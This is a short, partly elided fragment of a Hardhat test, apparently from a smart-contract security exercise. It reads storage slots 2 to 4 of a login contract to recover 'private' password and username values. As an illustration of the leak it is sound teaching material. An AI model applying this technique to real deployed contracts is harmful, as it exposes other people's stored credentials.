...
describe("Attack", () => {
  it("Should be able to read the private variables password and username", async () => {
    ...
    const slot2Bytes = await hre.ethers.provider.getStorage(loginContract.target, 2);
    const slot3Bytes = await hre.ethers.provider.getStorage(loginContract.target, 3);
    const slot4Bytes = await hre.ethers.provider.getStorage(loginContract.target, 4);
    
    console.log('Slot2/3/4', [slot2Bytes, slot3Bytes,slot4Bytes]);
